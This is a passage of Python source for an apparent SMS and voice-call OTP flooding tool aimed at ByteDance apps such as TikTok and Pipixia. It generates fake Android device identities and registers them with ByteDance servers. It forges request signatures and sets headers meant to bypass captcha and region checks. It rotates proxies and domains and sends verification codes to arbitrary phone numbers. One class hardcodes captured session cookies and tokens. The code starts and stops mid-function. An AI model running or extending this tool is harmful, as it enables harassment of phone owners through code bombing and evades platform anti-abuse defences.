        "Tecno": ["CK7n", "CK8n", "CK9n", "CH9n", "CL8", "CL7n", "CK6n", "CH7n", "CK8", "CL6"],
    }

    ANDROID_VERSIONS = ["12", "13", "14"]
    API_LEVELS = {"12": "31", "13": "33", "14": "34"}

    BUILD_IDS = [
        "TQ3A.230901.001", "UP1A.231005.007", "AP3A.240905.015", "BP1A.250305.019",
    ]

    CRONET_VERSIONS = ["b714bfef_2024-09-13", "02785bc3_2023-06-20", "03896cd4_2023-09-15"]

    def __init__(self):
        self.generation_count = 0
        self._lock = asyncio.Lock()
        self.app = BYTEDANCE_APPS[DEFAULT_APP]

    def set_app(self, app_key: str):
        """Set which ByteDance app to register devices for"""
        app_key = app_key.lower()
        if app_key in CONFIRMED_APPS:
            self.app = CONFIRMED_APPS[app_key]
        elif app_key in BYTEDANCE_APPS:
            self.app = BYTEDANCE_APPS[app_key]

    def _register_device(self, brand: str, model: str, android_version: str,
                         api_level: str, build_id: str, resolution: str,
                         dpi: str, openudid: str, cdid: str,
                         proxy: Optional[str] = None) -> Optional[Dict]:
        """Register device with ByteDance server to get valid device_id and install_id"""
        timestamp = int(time.time())
        app = self.app
        domain = app.get("register_domain", app["domains"][0])
        register_params = {
            "aid": str(app["aid"]), "app_name": app["app_name"],
            "version_code": app["version_code"], "version_name": app["version_name"],
            "device_platform": "android", "os": "android",
            "os_api": api_level, "os_version": android_version,
            "device_type": model, "device_brand": brand,
            "language": "en", "ac": "wifi", "channel": app["channel"],
            "resolution": resolution, "dpi": dpi,
            "openudid": openudid, "cdid": cdid,
            "update_version_code": app["version_code"],
            "manifest_version_code": app["version_code"],
            "ts": str(timestamp), "_rticket": str(timestamp * 1000),
        }
        body = json.dumps({
            "magic_tag": "ss_app_log",
            "header": {
                "display_name": app["name"],
                "update_version_code": int(app["version_code"]),
                "manifest_version_code": int(app["version_code"]),
                "aid": app["aid"], "channel": app["channel"],
                "package": app["package"], "app_version": app["version_name"],
                "version_code": int(app["version_code"]),
                "sdk_version": "2.14.0-rc.8",
                "os": "Android", "os_version": android_version, "os_api": int(api_level),
                "device_model": model, "device_brand": brand,
                "device_manufacturer": brand, "cpu_abi": "arm64-v8a",
                "release_build": "f66b21c_20241009",
                "density_dpi": int(dpi), "display_density": "xxhdpi",
                "resolution": resolution.replace("*", "x"),
                "language": "en", "timezone": 5, "access": "wifi",
                "not_request_sender": 0, "rom": build_id,
                "rom_version": f"android{android_version}-release",
                "cdid": cdid, "sig_hash": "aea615ab", "openudid": openudid,
                "clientudid": str(uuid.uuid4()), "region": "US",
                "tz_name": "Asia/Karachi", "tz_offset": 18000, "sim_region": "pk",
            },
            "_gen_ts": timestamp,
        })
        url = f"https://{domain}/service/2/device_register/?{urlencode(register_params)}"
        ua = f"{app['package']}/{app['version_code']} (Linux; U; Android {android_version}; en_US; {model}; Build/{build_id}; Cronet/TTNetVersion:b714bfef 2024-09-13 QuicVersion:c459d547 2024-08-27)"
        headers = {
            "Host": domain, "User-Agent": ua,
            "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate",
        }
        session = requests.Session()
        if proxy:
            if not proxy.startswith("http") and not proxy.startswith("socks"):
                proxy = f"http://{proxy}"
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.post(url, data=body, headers=headers, verify=False, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                return {
                    "device_id": str(data["device_id"]),
                    "iid": str(data["install_id"]),
                }
        except Exception as e:
            logger.warning(f"Device registration failed: {e}")
        finally:
            session.close()
        return None

    def generate_fresh_identity(self, proxy: Optional[str] = None) -> Dict:
        """Generate a fresh device identity with server-registered device_id/iid"""
        self.generation_count += 1

        brand = random.choice(list(self.DEVICE_BRANDS.keys()))
        model = random.choice(self.DEVICE_BRANDS[brand])
        android_version = random.choice(self.ANDROID_VERSIONS)
        api_level = self.API_LEVELS[android_version]
        build_id = random.choice(self.BUILD_IDS)
        cronet_version = random.choice(self.CRONET_VERSIONS)

        resolutions = ["1080*2400", "1080*2340", "1080*2282", "1440*3200", "1080*2520"]
        resolution = random.choice(resolutions)
        dpi = random.choice(["420", "480", "560"])

        openudid = ''.join(random.choices('0123456789abcdef', k=16))
        cdid = str(uuid.uuid4())
        odin_tt = ''.join(random.choices('0123456789abcdef', k=160))
        csrf_token = ''.join(random.choices('0123456789abcdef', k=32))

        # Register device to get valid device_id and install_id
        reg = self._register_device(
            brand, model, android_version, api_level,
            build_id, resolution, dpi, openudid, cdid, proxy
        )
        if reg:
            device_id = reg["device_id"]
            iid = reg["iid"]
        else:
            # Fallback to random IDs (may get 403)
            device_id = ''.join(random.choices(string.digits, k=16))
            iid = ''.join(random.choices(string.digits, k=16))
            logger.warning("Device registration failed, using random IDs (may get 403)")

        return {
            "device_id": device_id, "iid": iid, "openudid": openudid, "cdid": cdid,
            "device_type": model, "device_brand": brand,
            "os_api": api_level, "os_version": android_version,
            "resolution": resolution, "dpi": dpi,
            "build_id": build_id, "cronet_version": cronet_version,
            "odin_tt": odin_tt, "csrf_token": csrf_token,
            "generation_number": self.generation_count,
        }

    def get_stats(self) -> Dict:
        return {
            "total_generated": self.generation_count,
        }


# ============================================
# BYTEDANCE MULTI-APP OTP SENDER
# ============================================

class ByteDanceOTPSender:
    """Multi-App OTP Sender - Works with any ByteDance app via v8404 signature"""

    ENDPOINT = "/passport/mobile/send_code/v1/"

    def __init__(self, identity_generator: DeviceIdentityGenerator, app_key: str = DEFAULT_APP):
        self.identity_generator = identity_generator
        self.current_identity = None
        self._override_domain: Optional[str] = None
        self._override_tc: Optional[int] = None
        self._override_aid: Optional[int] = None
        self.set_app(app_key)

    def _get_aid(self):
        """Return overridden AID if set, otherwise the app's default AID."""
        return self._override_aid if self._override_aid else self.app["aid"]

    def set_app(self, app_key: str):
        """Switch to a different ByteDance app (checks CONFIRMED_APPS first, then BYTEDANCE_APPS)"""
        app_key = app_key.lower()
        if app_key in CONFIRMED_APPS:
            self.app = CONFIRMED_APPS[app_key]
        elif app_key in BYTEDANCE_APPS:
            self.app = BYTEDANCE_APPS[app_key]
        else:
            app_key = DEFAULT_APP
            self.app = BYTEDANCE_APPS[app_key]
        self.app_key = app_key
        self.identity_generator.set_app(app_key)

    def _create_session(self, proxy: Optional[str] = None) -> requests.Session:
        session = requests.Session()
        if proxy:
            if not proxy.startswith("http") and not proxy.startswith("socks"):
                proxy = f"http://{proxy}"
            session.proxies = {"http": proxy, "https": proxy}
        return session

    def refresh_identity(self, proxy: Optional[str] = None) -> Dict:
        self.current_identity = self.identity_generator.generate_fresh_identity(proxy=proxy)
        return self.current_identity

    def _get_config(self) -> Dict:
        if not self.current_identity:
            self.refresh_identity()
        config = {
            "app_name": self.app["app_name"], "aid": self._get_aid(),
            "version_code": self.app["version_code"], "version_name": self.app["version_name"],
            "manifest_version_code": self.app["version_code"],
            "update_version_code": self.app["version_code"],
            "passport_sdk_version": self.app.get("passport_sdk_version", "50559"),
            "os": "android", "device_platform": "android",
            "channel": self.app["channel"], "carrier_region": "PK",
            "language": "en", "ac": "wifi", "ssmix": "a",
            "device_id": self.current_identity["device_id"],
            "iid": self.current_identity["iid"],
            "cdid": self.current_identity["cdid"],
            "device_type": self.current_identity["device_type"],
            "device_brand": self.current_identity["device_brand"],
            "os_api": self.current_identity["os_api"],
            "os_version": self.current_identity["os_version"],
            "resolution": self.current_identity["resolution"],
            "dpi": self.current_identity["dpi"],
        }
        return config

    def _get_cookies(self) -> Dict:
        if not self.current_identity:
            self.refresh_identity()
        return {
            "odin_tt": self.current_identity["odin_tt"],
            "install_id": self.current_identity["iid"],
            "passport_csrf_token_default": self.current_identity["csrf_token"],
        }

    def _encrypt_phone(self, phone_number: str) -> str:
        if SIGNERPY_AVAILABLE:
            return xor(phone_number)
        encrypted = ""
        for char in phone_number:
            encrypted_byte = ord(char) ^ 5
            encrypted += format(encrypted_byte, '02x')
        return encrypted

    def _build_common_params(self, config: Dict) -> Dict:
        """Common params shared between URL and body"""
        return {
            "passport-sdk-version": config["passport_sdk_version"],
            "iid": config["iid"], "device_id": config["device_id"],
            "ac": config["ac"], "channel": config["channel"],
            "aid": str(config["aid"]), "app_name": config["app_name"],
            "version_code": config["version_code"], "version_name": config["version_name"],
            "device_platform": config["device_platform"], "os": config["os"],
            "ssmix": config["ssmix"], "device_type": config["device_type"],
            "device_brand": config["device_brand"], "language": config["language"],
            "os_api": config["os_api"], "os_version": config["os_version"],
            "manifest_version_code": config["manifest_version_code"],
            "resolution": config["resolution"], "dpi": config["dpi"],
            "update_version_code": config["update_version_code"],
            "cdid": config["cdid"],
            "carrier_region": config["carrier_region"],
        }

    def _build_url_params(self, config: Dict, timestamp: int) -> str:
        rticket = str(timestamp * 1000 + random.randint(1000, 9999))
        params = self._build_common_params(config)
        params["_rticket"] = rticket
        params["ts"] = str(timestamp)
        return urlencode(params)

    def _build_body(self, phone_number: str, config: Dict, timestamp: int, type_code: Optional[int] = None) -> str:
        encrypted_mobile = self._encrypt_phone(phone_number)
        rticket = str(timestamp * 1000 + random.randint(1000, 9999))
        params = self._build_common_params(config)
        if type_code is None:
            type_code = getattr(self, '_override_tc', None)
        if type_code is None:
            codes = self.app.get("type_codes") or [self.app.get("type_code", 3635)]
            type_code = random.choice(codes)
        params.update({
            "auto_read": "0", "account_sdk_source": "app",
            "unbind_exist": "35", "mix_mode": "1",
            "mobile": encrypted_mobile,
            "type": str(type_code),
            "_rticket": rticket, "ts": str(timestamp),
            # Enhanced params (discovered via Ultra Brute Force v2.0 research)
            "is6Digits": "1", "check_register": "1", "multi_login": "1",
        })
        return urlencode(params)

    def _build_cookie_string(self, cookies: Dict) -> str:
        return "; ".join([f"{k}={v}" for k, v in cookies.items()])

    def _generate_signatures(self, url_params: str, body: str, cookie_str: str, config: Dict) -> Dict:
        if not SIGNERPY_AVAILABLE:
            raise Exception("SignerPy library not available!")
        return SP.sign(
            params=url_params,
            payload=body,
            cookie=cookie_str,
            version=8404,
            aid=config["aid"],
        )

    def _build_headers(self, config: Dict, cookies: Dict, timestamp: int, signatures: Dict, body: str, domain: str = None) -> Dict:
        rticket = str(timestamp * 1000 + random.randint(1000, 9999))
        cookie_str = self._build_cookie_string(cookies)
        build_id = self.current_identity.get("build_id", "UP1A.231005.007")
        cronet_tag = self.current_identity.get("cronet_version", "b714bfef_2024-09-13")
        cronet_parts = cronet_tag.split("_") if "_" in cronet_tag else [cronet_tag, "2024-09-13"]

        host = domain or self.app["domains"][0]
        return {
            "Host": host,
            "Connection": "keep-alive",
            "Content-Length": str(len(body)),
            "Cookie": cookie_str,
            "x-tt-passport-csrf-token": cookies.get("passport_csrf_token_default", ""),
            "X-SS-REQ-TICKET": rticket,
            "x-vc-bdturing-sdk-version": "3.7.2.cn",
            "sdk-version": "2",
            "passport-sdk-version": config["passport_sdk_version"],
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-SS-DP": str(config["aid"]),
            "User-Agent": f"{self.app['package']}/{config['version_code']} (Linux; U; Android {config['os_version']}; en_US; {config['device_type']}; Build/{build_id}; Cronet/TTNetVersion:{cronet_parts[0]} {cronet_parts[1]} QuicVersion:c459d547 2024-08-27)",
            "Accept-Encoding": "gzip, deflate",
            # Enhanced bypass headers (discovered via Ultra Brute Force v2.0 + APK RE v3.0)
            "x-tt-bypass-dp": "1",
            "x-tt-dm-status": "login=0;ct=0;rt=7",
            "x-tt-store-region": random.choice(["au", "de", "sg", "us", "gb"]),
            "x-tt-store-region-src": "did",
            # APK RE v3.0: NEW headers from TikTok 45.0.42 DEX analysis
            "x-tt-bypass-bdturing": "1",
            "x-tt-cmpl-token": "",
            "x-tt-cipher-version": "1",
            "x-tt-app-init-region": random.choice(["US", "AU", "DE", "SG", "GB"]),
            "x-tt-request-tag": "t=0;n=1",
            "X-Gorgon": signatures.get("x-gorgon", ""),
            "X-Khronos": signatures.get("x-khronos", str(timestamp)),
            "X-Argus": signatures.get("x-argus", ""),
            "X-Ladon": signatures.get("x-ladon", ""),
            "X-SS-STUB": signatures.get("x-ss-stub", hashlib.md5(body.encode()).hexdigest().upper()),
        }

    def _send_web_endpoint(self, phone: str, proxy: Optional[str] = None) -> Dict:
        """Web-based OTP send — NO signing, NO device registration needed!"""
        start_time = time.time()
        encrypted = self._encrypt_phone(phone)
        domain = getattr(self, '_override_domain', None) or random.choice(self.app["domains"])
        codes = self.app.get("type_codes") or [3635]
        tc = getattr(self, '_override_tc', None) or random.choice(codes)

        body = urlencode({
            "mobile": encrypted, "type": str(tc),
            "aid": str(self._get_aid()), "app_name": self.app["app_name"],
            "account_sdk_source": "web", "mix_mode": "1", "auto_read": "0",
        })
        url = f"https://{domain}/passport/web/send_code/?aid={self._get_aid()}&app_name={self.app['app_name']}"
        headers = {
            "Host": domain,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": f"https://{domain}",
            "Referer": f"https://{domain}/",
            "X-SS-DP": str(self._get_aid()),
        }
        session = self._create_session(proxy)
        try:
            response = session.post(url, data=body, headers=headers, verify=False, timeout=REQUEST_TIMEOUT)
            elapsed = (time.time() - start_time) * 1000
            try:
                result = response.json()
                result["success"] = result.get("message") == "success"
                result["proxy_used"] = proxy or "Direct"
                result["method"] = "web_unsigned"
                result["domain"] = domain
                result["time_ms"] = elapsed
                result["phone"] = phone
                return result
            except json.JSONDecodeError:
                # Server returned HTML instead of JSON — retry with different domain/tc
                other_domains = [d for d in self.app["domains"] if d != domain]
                if other_domains:
                    retry_domain = random.choice(other_domains)
                    retry_tc = random.choice([c for c in codes if c != tc] or codes)
                    retry_body = urlencode({
                        "mobile": encrypted, "type": str(retry_tc),
                        "aid": str(self._get_aid()), "app_name": self.app["app_name"],
                        "account_sdk_source": "web", "mix_mode": "1", "auto_read": "0",
                    })
                    retry_url = f"https://{retry_domain}/passport/web/send_code/?aid={self._get_aid()}&app_name={self.app['app_name']}"
                    retry_headers = dict(headers)
                    retry_headers["Host"] = retry_domain
                    retry_headers["Origin"] = f"https://{retry_domain}"
                    retry_headers["Referer"] = f"https://{retry_domain}/"
                    try:
                        r2 = session.post(retry_url, data=retry_body, headers=retry_headers, verify=False, timeout=REQUEST_TIMEOUT)
                        result = r2.json()
                        result["success"] = result.get("message") == "success"
                        result["proxy_used"] = proxy or "Direct"
                        result["method"] = "web_unsigned_retry"
                        result["domain"] = retry_domain
                        result["time_ms"] = (time.time() - start_time) * 1000
                        result["phone"] = phone
                        return result
                    except Exception: pass
                return {"error": "Invalid JSON response", "raw": response.text[:200], "success": False, "time_ms": elapsed, "phone": phone}
        except requests.exceptions.RequestException as e:
            elapsed = (time.time() - start_time) * 1000
            return {"error": str(e), "success": False, "time_ms": elapsed, "phone": phone}
        finally:
            session.close()

    def _send_unsigned_mobile(self, phone: str, proxy: Optional[str] = None) -> Dict:
        """Mobile endpoint WITHOUT signatures — works on tiktokv.com domains!"""
        start_time = time.time()
        encrypted = self._encrypt_phone(phone)
        domain = getattr(self, '_override_domain', None) or random.choice(self.app["domains"])
        codes = self.app.get("type_codes") or [3635]
        tc = getattr(self, '_override_tc', None) or random.choice(codes)
        timestamp = int(time.time())
        device_id = str(random.randint(10**15, 10**16-1))
        iid = str(random.randint(10**15, 10**16-1))

        common_params = {
            "aid": str(self._get_aid()), "app_name": self.app["app_name"],
            "version_code": self.app["version_code"], "version_name": self.app["version_name"],
            "device_platform": "android", "os": "android",
            "device_id": device_id, "iid": iid,
            "ssmix": "a", "carrier_region": "US",
            "passport-sdk-version": "50559",
            "ts": str(timestamp), "_rticket": str(timestamp * 1000),
        }
        body_params = dict(common_params)
        body_params.update({
            "mobile": encrypted, "type": str(tc),
            "auto_read": "0", "account_sdk_source": "app",
            "unbind_exist": "35", "mix_mode": "1",
        })
        url = f"https://{domain}{self.ENDPOINT}?{urlencode(common_params)}"
        body = urlencode(body_params)
        headers = {
            "Host": domain,
            "User-Agent": f"{self.app['package']}/{self.app['version_code']} (Linux; U; Android 13; en_US; SM-G991B; Build/UP1A.231005.007)",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept-Encoding": "gzip, deflate",
            "X-SS-DP": str(self._get_aid()),
            "sdk-version": "2",
            "passport-sdk-version": "50559",
        }
        session = self._create_session(proxy)
        try:
            response = session.post(url, data=body, headers=headers, verify=False, timeout=REQUEST_TIMEOUT)
            elapsed = (time.time() - start_time) * 1000
            try:
                result = response.json()
                result["success"] = result.get("message") == "success"
                result["proxy_used"] = proxy or "Direct"
                result["method"] = "unsigned_mobile"
                result["domain"] = domain
                result["time_ms"] = elapsed
                result["phone"] = phone
                return result
            except json.JSONDecodeError:
                return {"error": "Invalid JSON response", "raw": response.text[:200], "success": False, "time_ms": elapsed, "phone": phone}
        except requests.exceptions.RequestException as e:
            elapsed = (time.time() - start_time) * 1000
            return {"error": str(e), "success": False, "time_ms": elapsed, "phone": phone}
        finally:
            session.close()

    VOICE_ENDPOINT = "/passport/mobile/send_voice_code/"

    def _send_voice_call(self, phone: str, proxy: Optional[str] = None) -> Dict:
        """Voice call OTP — uses same signing as mobile but /send_voice_code/ endpoint.
        Discovered via Ultra Brute Force v2.0 Phase 2: rate-limited on TikTok, TikTok Lite, Helo, BD 259."""
        start_time = time.time()
        self.refresh_identity(proxy=proxy)
        config = self._get_config()
        cookies = self._get_cookies()
        timestamp = int(time.time())
        url_params = self._build_url_params(config, timestamp)
        body = self._build_body(phone, config, timestamp)
        cookie_str = self._build_cookie_string(cookies)
        try:
            signatures = self._generate_signatures(url_params, body, cookie_str, config)
        except Exception as e:
            return {"error": str(e), "success": False, "time_ms": (time.time() - start_time) * 1000, "phone": phone}
        domain = getattr(self, '_override_domain', None) or random.choice(self.app["domains"])
        headers = self._build_headers(config, cookies, timestamp, signatures, body, domain)
        url = f"https://{domain}{self.VOICE_ENDPOINT}?{url_params}"
        session = self._create_session(proxy)
        try:
            response = session.post(url, data=body, headers=headers, verify=False, timeout=REQUEST_TIMEOUT)
            elapsed = (time.time() - start_time) * 1000
            try:
                result = response.json()
                result["success"] = result.get("message") == "success"
                result["proxy_used"] = proxy or "Direct"
                result["device_id"] = config["device_id"]
                result["method"] = "voice_call"
                result["endpoint"] = self.VOICE_ENDPOINT
                result["domain"] = domain
                result["time_ms"] = elapsed
                result["phone"] = phone
                return result
            except json.JSONDecodeError:
                return {"error": "Invalid JSON", "raw": response.text[:200], "success": False,
                        "method": "voice_call", "time_ms": elapsed, "phone": phone}
        except requests.exceptions.RequestException as e:
            return {"error": str(e), "success": False, "time_ms": (time.time() - start_time) * 1000, "phone": phone}
        finally:
            session.close()

    def send_otp_sync(self, phone_number: str, proxy: Optional[str] = None,
                      override_domain: Optional[str] = None, override_tc: Optional[int] = None,
                      override_aid: Optional[int] = None) -> Dict:
        """Synchronous OTP send - Routes to appropriate method based on app config"""
        phone = phone_number.strip().replace(" ", "").replace("-", "")
        if not phone.startswith("+"):
            phone = "+" + phone

        # Store overrides for use in sub-methods
        self._override_domain = override_domain
        self._override_tc = override_tc
        self._override_aid = override_aid

        # Route to web endpoint if configured (no signing needed)
        if self.app.get("web_endpoint"):
            return self._send_web_endpoint(phone, proxy)

        # Route to unsigned mobile if configured (no signing needed)
        if self.app.get("unsigned_mobile"):
            return self._send_unsigned_mobile(phone, proxy)

        # Route to voice call endpoint if configured
        if self.app.get("voice_endpoint"):
            return self._send_voice_call(phone, proxy)

        # Default: signed mobile endpoint with device registration
        start_time = time.time()

        # Fresh identity for each request (register device via API)
        self.refresh_identity(proxy=proxy)

        config = self._get_config()
        cookies = self._get_cookies()
        timestamp = int(time.time())

        url_params = self._build_url_params(config, timestamp)
        body = self._build_body(phone, config, timestamp)
        cookie_str = self._build_cookie_string(cookies)

        try:
            signatures = self._generate_signatures(url_params, body, cookie_str, config)
        except Exception as e:
            return {"error": str(e), "success": False, "time_ms": (time.time() - start_time) * 1000, "phone": phone}

        # Use override domain if set, otherwise randomize
        domain = getattr(self, '_override_domain', None) or random.choice(self.app["domains"])
        headers = self._build_headers(config, cookies, timestamp, signatures, body, domain)
        # Use alt_endpoint randomly if available (e.g. /passport/mobile/send_code/ without v1)
        endpoint = self.ENDPOINT
        if self.app.get("alt_endpoint") and random.random() < 0.5:
            endpoint = self.app["alt_endpoint"]
        url = f"https://{domain}{endpoint}?{url_params}"

        session = self._create_session(proxy)

        try:
            response = session.post(url, data=body, headers=headers, verify=False, timeout=REQUEST_TIMEOUT)
            elapsed = (time.time() - start_time) * 1000
            try:
                result = response.json()
                result["success"] = result.get("message") == "success"
                result["proxy_used"] = proxy or "Direct"
                result["device_id"] = config["device_id"]
                result["time_ms"] = elapsed
                result["phone"] = phone
                return result
            except json.JSONDecodeError:
                return {"error": "Invalid JSON response", "raw": response.text[:200], "success": False, "time_ms": elapsed, "phone": phone}
        except requests.exceptions.RequestException as e:
            elapsed = (time.time() - start_time) * 1000
            return {"error": str(e), "success": False, "time_ms": elapsed, "phone": phone}
        finally:
            session.close()


# ============================================
# SUPER/PIPIXIA OTP SENDER (WORKING WITH SIGNERPY 8404)
# ============================================

class SuperOTPSender:
    """Super/Pipixia OTP Sender - EXACT CAPTURED DATA (CONFIRMED WORKING)"""
    
    BASE_URL = "https://api5.pipix.com"
    ENDPOINT = "/passport/mobile/send_code/v1/"
    
    # EXACT captured data - CONFIRMED WORKING
    DEVICE_ID = "3827862042313376"
    IID = "1101084309068844"
    CDID = "5c1fe491-72a3-4bd4-af7e-352df416c435"
    CSRF_TOKEN = "92fb494b07df6f4d0c37ecda77efd78f"
    ODIN_TT = "306de257ce19f431561b1d01e206188371d51d6b606339dfdeb85d058f2fa1a4f76d9dce4e68d5c1590a1887999d56ffd5b4244f1c3413b163ed1ae25d188698f32f9483851636b434e6195bdd0cb133"
    TTREQ = "1$50ded64cdf1f1984f5d0d44dcd91f821d8ac04be"
    TTREQ_TOB = "1$ad558ceca2aaf307f7dfc072e9c3f93f0dc50970"
    BAIDUID = "67C670DF77E12B149DD8097945F71713:FG=1"
    
    # Base config
    BASE_CONFIG = {
        "app_name": "super",
        "aid": 1319,
        "version_code": "620",
        "version_name": "6.2.0",
        "manifest_version_code": "620",
        "update_version_code": "62050",
        "passport_sdk_version": "50559",
        "device_platform": "android",
        "os": "android",
        "channel": "update",
        "carrier_region": "PK",
        "app_language": "EN",
        "app_region": "US",
        "sys_region": "US",
        "time_zone": "Asia/Karachi",
        "ac": "wifi",
        "ssmix": "a",
        "language": "en",
        "os_api": "34",
        "os_version": "14",
        "resolution": "1080*2282",
        "dpi": "480",
        "device_type": "NOTE+23",
        "device_brand": "VGO_TEL",
    }
    
    TYPE_CODE = 3536  # Afghanistan working code
    RATE_LIMIT_DELAY = 3  # Seconds to wait between requests
    
    def __init__(self, identity_generator: DeviceIdentityGenerator):
        self.identity_generator = identity_generator
        self.last_request_time = 0
    
    def _encrypt_phone(self, phone_number: str) -> str:
        """XOR encrypt phone number"""
        if SIGNERPY_AVAILABLE:
            try:
                return xor(phone_number)
            except:
                pass
        encrypted = ""
        for char in phone_number:
            encrypted_byte = ord(char) ^ 5
            encrypted += format(encrypted_byte, '02x')
        return encrypted
    
    def _build_cookie_string(self) -> str:
        """Build cookie string from EXACT captured data"""
        cookies = [
            f"ttreq_tob={self.TTREQ_TOB}",
            f"install_id={self.IID}",
            f"ttreq={self.TTREQ}",
            f"BAIDUID={self.BAIDUID}",
            f"odin_tt={self.ODIN_TT}",
            f"passport_csrf_token_default={self.CSRF_TOKEN}",
        ]
        return "; ".join(cookies)
    
    def _build_url_params(self, timestamp: int) -> str:
        """Build URL parameters with EXACT captured device data"""
        rticket = str(timestamp * 1000 + 1234)
        params = {
            "passport-sdk-version": self.BASE_CONFIG["passport_sdk_version"],
            "use_new_token_expire_rule": "true",
            "iid": self.IID,
            "device_id": self.DEVICE_ID,
            "ac": self.BASE_CONFIG["ac"],
            "channel": self.BASE_CONFIG["channel"],
            "aid": str(self.BASE_CONFIG["aid"]),
            "app_name": self.BASE_CONFIG["app_name"],
            "version_code": self.BASE_CONFIG["version_code"],
            "version_name": self.BASE_CONFIG["version_name"],
            "device_platform": self.BASE_CONFIG["device_platform"],
            "os": self.BASE_CONFIG["os"],
            "ssmix": self.BASE_CONFIG["ssmix"],
            "device_type": self.BASE_CONFIG["device_type"],
            "device_brand": self.BASE_CONFIG["device_brand"],
            "language": self.BASE_CONFIG["language"],
            "os_api": self.BASE_CONFIG["os_api"],
            "os_version": self.BASE_CONFIG["os_version"],
            "manifest_version_code": self.BASE_CONFIG["manifest_version_code"],
            "resolution": self.BASE_CONFIG["resolution"],
            "dpi": self.BASE_CONFIG["dpi"],
            "update_version_code": self.BASE_CONFIG["update_version_code"],
            "_rticket": rticket,
            "cdid": self.CDID,
            "recommend_disable": "0",
            "carrier_region": self.BASE_CONFIG["carrier_region"],
            "app_language": self.BASE_CONFIG["app_language"],
            "app_region": self.BASE_CONFIG["app_region"],
            "sys_region": self.BASE_CONFIG["sys_region"],
            "update_install_update_version": self.BASE_CONFIG["update_version_code"],
            "time_zone": self.BASE_CONFIG["time_zone"],
            "last_update_version_code": "0",
            "ts": str(timestamp),
        }
        return urlencode(params)
    
    def _build_body(self, phone_number: str, timestamp: int) -> str:
        """Build request body with encrypted phone"""
        encrypted_mobile = self._encrypt_phone(phone_number)
        rticket = str(timestamp * 1000 + 1233)
        params = {
            "auto_read": "0",
            "account_sdk_source": "app",
            "passport_support_flow": "captcha,verify",
            "unbind_exist": "35",
            "mix_mode": "1",
            "mobile": encrypted_mobile,
            "type": str(self.TYPE_CODE),
            "iid": self.IID,
            "device_id": self.DEVICE_ID,
            "ac": self.BASE_CONFIG["ac"],
            "channel": self.BASE_CONFIG["channel"],
            "aid": str(self.BASE_CONFIG["aid"]),
            "app_name": self.BASE_CONFIG["app_name"],
            "version_code": self.BASE_CONFIG["version_code"],
            "version_name": self.BASE_CONFIG["version_name"],
            "device_platform": self.BASE_CONFIG["device_platform"],
            "os": self.BASE_CONFIG["os"],
            "ssmix": self.BASE_CONFIG["ssmix"],
            "device_type": self.BASE_CONFIG["device_type"],
            "device_brand": self.BASE_CONFIG["device_brand"],
            "language": self.BASE_CONFIG["language"],
            "os_api": self.BASE_CONFIG["os_api"],
            "os_version": self.BASE_CONFIG["os_version"],
            "manifest_version_code": self.BASE_CONFIG["manifest_version_code"],
            "resolution": self.BASE_CONFIG["resolution"],
            "dpi": self.BASE_CONFIG["dpi"],
            "update_version_code": self.BASE_CONFIG["update_version_code"],
            "cdid": self.CDID,
            "recommend_disable": "0",
            "carrier_region": self.BASE_CONFIG["carrier_region"],
            "app_language": self.BASE_CONFIG["app_language"],
            "app_region": self.BASE_CONFIG["app_region"],
            "sys_region": self.BASE_CONFIG["sys_region"],
            "update_install_update_version": self.BASE_CONFIG["update_version_code"],
            "time_zone": self.BASE_CONFIG["time_zone"],
            "last_update_version_code": "0",
            "_rticket": rticket,
            "ts": str(timestamp),
        }
        return urlencode(params)
    
    def _generate_signatures(self, url_params: str, body: str, cookie: str) -> Dict:
        """Generate signatures using SignerPy version 8404"""
        if not SIGNERPY_AVAILABLE:
            raise Exception("SignerPy library not available!")
        return sign(params=url_params, payload=body, cookie=cookie, version=8404, aid=self.BASE_CONFIG["aid"])
    
    def _build_headers(self, timestamp: int, signatures: Dict, cookie_str: str, rticket: str) -> Dict:
        """Build request headers"""
        return {
            "Host": "api5.pipix.com",
            "Connection": "keep-alive",
            "Cookie": cookie_str,
            "x-tt-passport-csrf-token": self.CSRF_TOKEN,
            "X-SS-REQ-TICKET": rticket,
            "x-vc-bdturing-sdk-version": "3.7.2.cn",
            "sdk-version": "2",
            "passport-sdk-version": self.BASE_CONFIG["passport_sdk_version"],
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-SS-DP": str(self.BASE_CONFIG["aid"]),
            "User-Agent": f"com.sup.android.superb/{self.BASE_CONFIG['manifest_version_code']} (Linux; U; Android {self.BASE_CONFIG['os_version']}; en_US; {self.BASE_CONFIG['device_type']}; Build/UP1A.231005.007; Cronet/TTNetVersion:b714bfef 2024-09-13 QuicVersion:c459d547 2024-08-27)",
            "Accept-Encoding": "gzip, deflate",
            "X-Gorgon": signatures.get("x-gorgon", ""),
            "X-Khronos": signatures.get("x-khronos", str(timestamp)),
            "X-Argus": signatures.get("x-argus", ""),
            "X-Ladon": signatures.get("x-ladon", ""),
        }
    
    def send_otp_sync(self, phone_number: str, proxy: Optional[str] = None, retry_with_delay: bool = True) -> Dict:
        """Send OTP via Super/Pipixia - with RATE LIMIT DELAYS"""
        phone = phone_number.strip().replace(" ", "").replace("-", "")
        if not phone.startswith("+"):
            phone = "+" + phone
        
        # Enforce delay between requests
        current_time = time.time()
        time_since_last = current_time - self.last_request_time
        if time_since_last < self.RATE_LIMIT_DELAY:
            delay_needed = self.RATE_LIMIT_DELAY - time_since_last
            time.sleep(delay_needed)
        
        start_time = time.time()
        timestamp = int(time.time())
        rticket = str(timestamp * 1000 + 1234)
        
        url_params = self._build_url_params(timestamp)
        body = self._build_body(phone, timestamp)
        cookie_str = self._build_cookie_string()
        
        try:
            signatures = self._generate_signatures(url_params, body, cookie_str)
        except Exception as e:
            return {"error": f"Signature error: {str(e)}", "success": False, "time_ms": (time.time() - start_time) * 1000, "phone": phone}
        
        headers = self._build_headers(timestamp, signatures, cookie_str, rticket)
        url = f"{self.BASE_URL}{self.ENDPOINT}?{url_params}"
        
        proxies = None
        if proxy:
            proxies = {"http": proxy, "https": proxy}
        
        try:
